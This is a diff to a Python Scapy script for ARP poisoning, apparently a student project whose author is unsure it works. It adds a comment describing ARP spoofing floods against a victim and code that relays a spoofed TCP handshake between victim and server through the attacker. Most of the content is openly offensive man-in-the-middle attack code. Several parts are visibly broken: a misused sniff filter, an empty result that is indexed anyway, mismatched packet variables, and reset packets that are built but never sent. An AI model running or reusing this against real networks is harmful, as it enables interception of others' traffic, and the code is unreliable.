@@ -7,6 +7,7 @@ import time;
 # - Silent vs All out options
 
 ### This is the file for ARP poisoning. I'm not sure if it works or how to test it :) 
+# first listen to ARP broadcast, then respond to victim, dan spam server with arp request, send victim a lot of arp responses and hope that we are the quickest.
 
 # Example run code that should do something, where x is ip range: 
 # python ARPpoisoning.py --scan x 
@@ -72,7 +73,7 @@ def arp_poisonening(victim_ip, server_ip):
 
 ## Try to do de syn-ack response poging 5
 # 
-def three_way_handshake(pkt, attackerMac, attackerIP, serverMac, serverIP):
+def three_way_handshake(pkt, victimMac, victimIP, attackerMac, attackerIP, serverMac, serverIP):
     # Forward SYN packet from victem to server, adjust packet to make the server think this is the victim
     ether = sc.Ether(src=attackerMac, dst=serverMac)
     ip = sc.IP(src=attackerIP, dst=serverIP)
@@ -91,7 +92,84 @@ def three_way_handshake(pkt, attackerMac, attackerIP, serverMac, serverIP):
     sc.sendp(new_pkt, iface=sc.conf.iface, verbose=False)
 
     # Sniff for SYN-ACK from server
+    ack = sc.sniff(lfilter=is_server_ack(pkt, serverIP, attackerIP), count=1, timeout=5)
+    if not ack:
+        ether_back = sc.Ether(src=attackerMac, dst=victimMac)
+        ip_back = sc.IP(src=attackerIP, dst=victimIP)
+        tcp_back = sc.TCP(
+            seq=pkt[sc.TCP].seq + 1,
+            ack=pkt[sc.TCP].seq,
+            flags='R'
+        )
+        return False
 
 
     # Forward adjusted SYN-ACK to victim
+    ether_back = sc.Ether(src=attackerMac, dst=victimMac)
+    ip_back = sc.IP(src=attackerIP, dst=victimIP)
+    tcp_back = sc.TCP(
+        sport=ack[sc.TCP].sport,
+        dport=ack[sc.TCP].dport,
+        seq=ack[sc.TCP].seq,
+        ack=ack[sc.TCP].ack,
+        flags=ack[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
+        raw_back = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether_back / ip_back / tcp_back / raw_back
+    else:
+        new_pkt_back = ether_back / ip_back / tcp_back
+    sc.sendp(new_pkt_back, iface=sc.conf.iface, verbose=False)
+
+    ## Forward adjusted ACK from victim to server
+    # Sniff for ACK from victim
+    ack = sc.sniff(lfilter=is_victim_ack(pkt, victimIP, attackerIP), count=1, timeout=5)
+    if not ack:
+        ether_back = sc.Ether(src=attackerMac, dst=serverMac)
+        ip_back = sc.IP(src=attackerIP, dst=serverIP)
+        tcp_back = sc.TCP(
+            seq=ack[sc.TCP].seq + 1,
+            ack=ack[sc.TCP].seq,
+            flags='R'
+        )
+        return False
+
+    # Forward adjusted ACK to server
+    ether_back = sc.Ether(src=attackerMac, dst=serverMac)
+    ip_back = sc.IP(src=attackerIP, dst=serverIP)
+    tcp_back = sc.TCP(
+        sport=pkt[sc.TCP].sport,
+        dport=pkt[sc.TCP].dport,
+        seq=pkt[sc.TCP].seq,
+        ack=pkt[sc.TCP].ack,
+        flags=pkt[sc.TCP].flags
+    )
+    if pkt.haslayer(sc.Raw):
+        raw_back = sc.Raw(load=pkt[sc.Raw].load)
+        new_pkt = ether_back / ip_back / tcp_back / raw_back
+    else:
+        new_pkt_back = ether_back / ip_back / tcp_back
+    sc.sendp(new_pkt_back, iface=sc.conf.iface, verbose=False)
+
+    return True
+
+        
+def is_server_ack(pkt, serverIP, attackerIP):
+    return (
+        pkt.haslayer(sc.TCP)
+        and pkt[sc.IP].src == serverIP
+        and pkt[sc.IP].dst == attackerIP
+        and pkt[sc.TCP].flags == "SA"
+    )
+
+def is_victim_ack(pkt, victimIP, attackerIP):
+    return (
+        pkt.haslayer(sc.TCP)
+        and pkt[sc.IP].src == victimIP
+        and pkt[sc.IP].dst == attackerIP
+        and pkt[sc.TCP].flags == "A"
+    )
+
+
+    
 
